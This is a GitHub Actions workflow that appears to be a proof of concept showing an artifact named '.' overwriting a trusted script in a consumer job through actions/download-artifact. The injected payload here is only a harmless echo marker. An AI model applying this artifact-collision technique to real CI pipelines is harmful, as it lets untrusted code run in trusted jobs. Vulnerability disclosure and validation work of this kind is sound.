name: actions artifact dot consumer execution validation

run-name: actions artifact dot consumer execution validation ${{ github.run_id }}

on:
  push:
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: read
  actions: read

jobs:
  untrusted-producer:
    runs-on: ubuntu-latest
    steps:
      - name: Create attacker controlled artifact payload
        run: |
          set -euo pipefail
          rm -rf payload-dot payload-safe
          mkdir -p payload-dot payload-safe
          cat > payload-dot/release.sh <<'SH'
          echo "ATTACKER-CODE-RAN-IN-CONSUMER-JOB-${GITHUB_RUN_ID}"
          SH
          printf 'safe-%s\n' "$GITHUB_RUN_ID" > payload-safe/safe.txt

      - name: Upload crafted dot artifact containing colliding root script
        uses: actions/upload-artifact@v7.0.1
        with:
          name: .
          path: payload-dot/release.sh
          retention-days: 1

      - name: Upload second artifact to force multi-artifact mode
        uses: actions/upload-artifact@v7.0.1
        with:
          name: safe-artifact
          path: payload-safe/safe.txt
          retention-days: 1

  trusted-consumer:
    needs: untrusted-producer
    runs-on: ubuntu-latest
    steps:
      - name: Prepare trusted consumer staging directory
        run: |
          set -euo pipefail
          rm -rf sandbox
          mkdir -p sandbox/inner
          cat > sandbox/inner/release.sh <<'SH'
          echo "TRUSTED-CONSUMER-SCRIPT-BEFORE-DOWNLOAD"
          SH
          chmod +x sandbox/inner/release.sh
          echo '--- before download ---'
          bash sandbox/inner/release.sh

      - name: Download all artifacts into trusted staging directory
        uses: actions/download-artifact@v8.0.1
        with:
          path: sandbox/inner

      - name: Execute trusted consumer script after artifact download
        run: |
          set -euo pipefail
          echo '--- filesystem result ---'
          find sandbox -maxdepth 4 -type f -print -exec sed -n '1p' {} \;
          echo '--- executing root script after download ---'
          bash sandbox/inner/release.sh | tee execution-output.txt
          grep -q "ATTACKER-CODE-RAN-IN-CONSUMER-JOB-$GITHUB_RUN_ID" execution-output.txt
          test -f sandbox/inner/safe-artifact/safe.txt
          echo 'dot artifact overwrote and controlled the script executed by the consumer job'
